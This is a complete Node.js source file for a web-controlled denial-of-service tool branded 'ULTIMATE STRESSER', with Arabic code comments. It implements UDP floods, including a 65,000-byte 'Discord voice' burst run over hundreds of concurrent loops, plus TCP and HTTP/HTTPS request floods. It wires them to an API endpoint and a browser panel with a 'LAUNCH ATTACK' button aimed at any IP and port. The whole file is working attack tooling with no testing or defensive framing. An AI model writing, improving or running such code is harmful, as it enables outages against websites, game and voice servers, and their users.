const express = require('express');
const dgram = require('dgram');
const net = require('net');
const http = require('http');
const https = require('https');
const crypto = require('crypto');

const app = express();
app.use(express.json());

let stats = { packets: 0, status: 'idle', target: '' };

// ---------- هجوم ديسكورد الصوتي (UDP MAX BURST) ----------
function discordVoiceFlood(target, port, duration) {
    const endTime = Date.now() + duration * 1000;
    // أقصى حجم ممكن لحزمة UDP لتفتيت الحزم في الشبكة
    const payload = crypto.randomBytes(65000); 
    
    const loop = () => {
        if (Date.now() > endTime) return;
        for (let i = 0; i < 100; i++) {
            const client = dgram.createSocket('udp4');
            client.send(payload, 0, payload.length, port, target, () => {
                stats.packets++;
                client.close();
            });
        }
        setImmediate(loop);
    };
    // 500 مسار متزامن
    for(let i=0; i<500; i++) loop();
}

// ---------- الهجمات الأخرى ----------
function udpFlood(target, port, duration) {
    const endTime = Date.now() + duration * 1000;
    const buffer = crypto.randomBytes(1024);
    const loop = () => {
        if (Date.now() > endTime) return;
        for (let i = 0; i < 50; i++) {
            const client = dgram.createSocket('udp4');
            client.send(buffer, 0, buffer.length, port, target, () => {
                stats.packets++;
                client.close();
            });
        }
        setImmediate(loop);
    };
    for(let i=0; i<100; i++) loop();
}

function tcpFlood(target, port, duration) {
    const endTime = Date.now() + duration * 1000;
    const loop = () => {
        if (Date.now() > endTime) return;
        for (let i = 0; i < 20; i++) {
            const client = new net.Socket();
            client.setTimeout(2000);
            client.connect(port, target, () => {
                client.write(crypto.randomBytes(1024));
                stats.packets++;
            });
            client.on('error', () => client.destroy());
            client.on('close', () => {});
            client.on('timeout', () => client.destroy());
        }
        setTimeout(loop, 10);
    };
    for(let i=0; i<40; i++) loop();
}

function httpFlood(target, port, duration, useHttps = false) {
    const endTime = Date.now() + duration * 1000;
    const mod = useHttps ? https : http;
    const loop = () => {
        if (Date.now() > endTime) return;
        for (let i = 0; i < 20; i++) {
            const req = mod.request({
                hostname: target, port: port, path: '/?' + crypto.randomBytes(4).toString('hex'),
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Connection': 'keep-alive' }
            }, (res) => {
                stats.packets++;
                res.on('data', () => {});
                res.on('end', () => {});
            });
            req.on('error', () => {});
            req.end();
        }
        setTimeout(loop, 5);
    };
    for(let i=0; i<40; i++) loop();
}

// ---------- API ----------
app.post('/api/attack', (req, res) => {
    const { target, port, method, duration } = req.body;
    if (!target || !port || !method || !duration) return res.status(400).json({ error: 'Missing parameters' });

    stats = { packets: 0, status: 'attacking', target: `${target}:${port}` };
    const p = parseInt(port);
    const d = parseInt(duration);

    try {
        if (method === 'discord') discordVoiceFlood(target, p, d);
        else if (method === 'udp') udpFlood(target, p, d);
        else if (method === 'tcp') tcpFlood(target, p, d);
        else if (method === 'http') httpFlood(target, p, d, false);
        else if (method === 'https') httpFlood(target, p, d, true);
        else return res.status(400).json({ error: 'Invalid method' });

        setTimeout(() => { stats.status = 'idle'; }, d * 1000);
        res.json({ success: true, message: `Attack launched on ${target}:${p}` });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/stats', (req, res) => {
    res.json(stats);
});

// ---------- الواجهة ----------
app.get('/', (req, res) => {
    res.send(`
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ULTIMATE STRESSER</title>
<style>
  * { box-sizing: border-box; }
  body { margin: 0; background: #050505; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
  .box { width: 100%; max-width: 400px; background: #0a0a0a; border: 1px solid #00ff00; padding: 20px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
  h1 { text-align: center; color: #ff0000; font-size: 22px; margin-bottom: 20px; text-shadow: 0 0 10px red; }
  label { display: block; margin-bottom: 5px; font-size: 13px; }
  input, select { width: 100%; padding: 12px; background: #111; color: #00ff00; border: 1px solid #333; margin-bottom: 15px; font-family: inherit; font-size: 16px; border-radius: 4px; }
  input:focus, select:focus { outline: none; border-color: #00ff00; }
  button { width: 100%; padding: 14px; background: #ff0000; color: #fff; border: none; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.2s; text-transform: uppercase; }
  button:hover { background: #cc0000; box-shadow: 0 0 15px red; }
  #stats-box { background: #000; border: 1px solid #333; padding: 10px; margin-top: 15px; font-size: 14px; color: #00ff00; border-radius: 4px; text-align: center; }
  .big-num { font-size: 28px; font-weight: bold; color: #fff; text-shadow: 0 0 10px #00ff00; }
</style>
</head>
<body>
<div class="box">
  <h1>☠️ ULTIMATE STRESSER ☠️</h1>
  <label>Target IP / URL</label>
  <input type="text" id="target" placeholder="1.1.1.1">
  
  <label>Port</label>
  <input type="number" id="port" value="80">
  
  <label>Method</label>
  <select id="method">
    <option value="discord">DISCORD VOICE (UDP MAX)</option>
    <option value="udp">UDP FLOOD</option>
    <option value="tcp">TCP FLOOD</option>
    <option value="http">HTTP FLOOD</option>
    <option value="https">HTTPS FLOOD</option>
  </select>
  
  <label>Duration (Seconds)</label>
  <input type="number" id="duration" value="30">
  
  <button onclick="launch()">LAUNCH ATTACK</button>
  
  <div id="stats-box">
    <div>PACKETS SENT</div>
    <div class="big-num" id="packet-count">0</div>
    <div id="status" style="font-size:12px; color:#888; margin-top:5px;">STATUS: IDLE</div>
  </div>
</div>

<script>
async function launch() {
  const target = document.getElementById('target').value;
  const port = document.getElementById('port').value;
  const method = document.getElementById('method').value;
  const duration = document.getElementById('duration').value;

  if (!target) return alert('Enter a target!');

  try {
    const res = await fetch('/api/attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target, port, method, duration })
    });
    const data = await res.json();
    if (!res.ok) alert('[ERROR] ' + data.error);
  } catch (err) {
    alert('[FAILED] Connection error.');
  }
}

setInterval(async () => {
  try {
    const res = await fetch('/api/stats');
    const data = await res.json();
    document.getElementById('packet-count').innerText = data.packets.toLocaleString();
    document.getElementById('status').innerText = 'STATUS: ' + data.status.toUpperCase() + ' (' + data.target + ')';
    if (data.status === 'attacking') {
      document.getElementById('status').style.color = '#ff0000';
    } else {
      document.getElementById('status').style.color = '#888';
    }
  } catch (e) {}
}, 1000);
</script>
</body>
</html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Ultimate Stresser running on ' + PORT));